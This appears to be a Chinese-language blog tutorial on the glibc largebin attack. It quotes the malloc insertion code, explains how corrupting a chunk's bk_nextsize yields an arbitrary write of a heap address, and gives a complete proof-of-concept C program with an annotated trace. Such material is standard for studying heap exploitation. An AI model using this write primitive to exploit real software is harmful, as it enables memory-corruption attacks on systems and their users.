---
title: lagerbin_attack
featured_image: ../assets/images/post/4.png
draft: false
---

## 源码
```c
    victim_index = largebin_index (size);
    bck = bin_at (av, victim_index);
    fwd = bck->fd;
assert (chunk_main_arena (bck->bk));
if ( size < chunksize_nomask (bck->bk)) //size 最小
{
       fwd = bck; //因为是相对于 victim 的结构所以这个要换一下 bck, fwd 来原本 bck 的位置
       bck = bck->bk; 

       victim->fd_nextsize = fwd->fd; 
       victim->bk_nextsize = fwd->fd->bk_nextsize;
       fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; /*先进行右值运算，如果在没有进行修改的情况下，等式可以化简为 fwd-> fd-> bk_nextsize = victim，也就是最大堆块的 bk_nextsize 指向我们的最小堆块 victim*/
}
```
## 利用
能修改一个 lager bin 的 bk_nextsize，且可以放进 lagebin 里一个比该 bin 小的 unsorted bin，然后就可以任意地址写一个 heap 地址(此时 size 的位置是控制不了的)
poc
```c
#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
int main(){
    size_t target=0xffffffffffffffff;

    size_t *bigger = malloc(0x428);
    malloc(0x18);
    size_t *smaller = malloc(0x418);
    malloc(0x18);
    free(bigger);
    malloc(0x438); 
    free(smaller);
    bigger[3] = (size_t)((&target)-4);
    size_t *g4 = malloc(0x438); //放进 lagebin 里一个比该 bin 小的 unsorted bin
    assert((size_t)(smaller-2) == target);
    return 0;
}
```
此时的源码状态
```c
if ( size < chunksize_nomask (bck->bk)) //size 最小
{
       fwd = bck; 
       bck = bck->bk; 
       /*此时：victim = smaller fwd-> fd = bigger */
       victim->fd_nextsize = fwd->fd; 
       victim->bk_nextsize = fwd->fd->bk_nextsize; //target 写入 victim-> bk_nextsize
       fwd->fd->bk_nextsize = victim; 
       victim->bk_nextsize->fd_nextsize = victim;  //victim 写入 target
}
```

顺便附上一张自己画的 largebin 的图

![](https://raw.githubusercontent.com/4ak5ra/image/main/屏幕截图 2025-04-24 131253.png)
